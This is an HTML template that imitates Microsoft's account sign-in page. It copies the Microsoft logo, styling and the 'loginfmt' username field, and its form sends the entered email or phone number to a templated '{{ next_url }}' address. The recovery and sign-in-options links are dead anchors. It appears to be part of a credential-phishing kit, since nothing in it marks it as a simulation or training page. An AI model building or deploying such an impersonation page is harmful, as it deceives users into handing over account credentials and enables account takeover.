<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Sign in to your account</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        body {
            background: linear-gradient(135deg, #f3f6fb 0%, #e9eef6 100%);
            min-height: 100vh;
            margin: 0;
            font-family: 'Segoe UI', Arial, Helvetica, sans-serif;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        .ms-card {
            background: #fff;
            border-radius: 12px;
            box-shadow: 0 4px 24px rgba(0,0,0,0.08);
            padding: 48px 40px 32px 40px;
            width: 100%;
            max-width: 360px;
            box-sizing: border-box;
            display: flex;
            flex-direction: column;
            align-items: center;
        }
        .ms-logo {
            margin-bottom: 32px;
        }
        .ms-title {
            font-size: 24px;
            font-weight: 600;
            color: #1b1b1b;
            margin-bottom: 24px;
            letter-spacing: -0.5px;
        }
        .ms-input {
            width: 100%;
            padding: 12px 14px;
            font-size: 16px;
            border: 1.5px solid #c7c7c7;
            border-radius: 6px;
            margin-bottom: 24px;
            outline: none;
            transition: border-color 0.2s;
        }
        .ms-input:focus {
            border-color: #0067b8;
        }
        .ms-btn {
            width: 100%;
            background: #0067b8;
            color: #fff;
            border: none;
            border-radius: 6px;
            padding: 12px 0;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: background 0.2s;
            margin-bottom: 16px;
        }
        .ms-btn:hover, .ms-btn:focus {
            background: #005ba1;
        }
        .ms-link {
            color: #0067b8;
            text-decoration: none;
            font-size: 14px;
            margin-top: 8px;
            display: block;
            text-align: left;
            width: 100%;
        }
        .ms-link:focus, .ms-link:hover {
            text-decoration: underline;
        }
        @media (max-width: 480px) {
            .ms-card {
                padding: 32px 12px 24px 12px;
            }
        }
    </style>
</head>
<body>
    <div class="ms-card">
        <div class="ms-logo">
            <!-- Microsoft logo SVG -->
            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 48 48" width="48" height="48" aria-label="Microsoft logo">
                <rect width="20" height="20" x="2" y="2" fill="#f25022"/>
                <rect width="20" height="20" x="26" y="2" fill="#7fba00"/>
                <rect width="20" height="20" x="2" y="26" fill="#00a4ef"/>
                <rect width="20" height="20" x="26" y="26" fill="#ffb900"/>
            </svg>
        </div>
        <div class="ms-title">Sign in</div>
        <form method="post" action="{{ next_url }}" style="width:100%">
            <input class="ms-input" type="text" name="loginfmt" placeholder="Email, phone, or Skype" required autofocus autocomplete="username">
            <button class="ms-btn" type="submit">Next</button>
        </form>
        <a class="ms-link" href="#">Canâ€™t access your account?</a>
        <a class="ms-link" href="#">Sign-in options</a>
    </div>
</body>
</html>
